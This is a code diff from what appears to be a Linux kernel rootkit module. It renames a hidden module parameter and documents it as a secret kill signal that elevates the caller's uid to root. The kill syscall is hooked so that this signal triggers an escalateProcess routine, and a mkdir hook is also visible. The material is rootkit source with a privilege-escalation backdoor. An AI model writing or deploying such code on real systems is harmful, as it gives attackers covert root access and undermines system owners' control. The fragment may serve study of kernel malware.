@@ -54,9 +54,9 @@ asmlinkage int totallyReal_mkdir(const char *pathname, mode_t mode){
 }
 
 //privilege escalation code
-int secretKillSig = 42;
-module_param(secretKillSig, int, 0);
-MODULE_PARM_DESC(secretKillSig, "define a kill signal which when used will replace the kill syscall with magic\n");
+int secretEscalationSig = 42;
+module_param(secretEscalationSig, int, 0);
+MODULE_PARM_DESC(secretEscalationSig, "define a kill signal which when used will elevate the uid of the caller to 0 (root)\n");
 
 void escalateProcess(pid_t pid){
 	pr_info("escalation called for pid %d\n", pid);
@@ -84,8 +84,8 @@ void escalateProcess(pid_t pid){
 
 asmlinkage int totallyReal_kill(pid_t pid, int sig){
 	pr_info("kill issued on pid %d with sig %d\n", pid, sig);
-	if(sig == secretKillSig){
-		pr_info("secretKillSig used");
+	if(sig == secretEscalationSig){
+		pr_info("secretEscalationSig used");
 		escalateProcess(pid);
 		return 0;
 	}
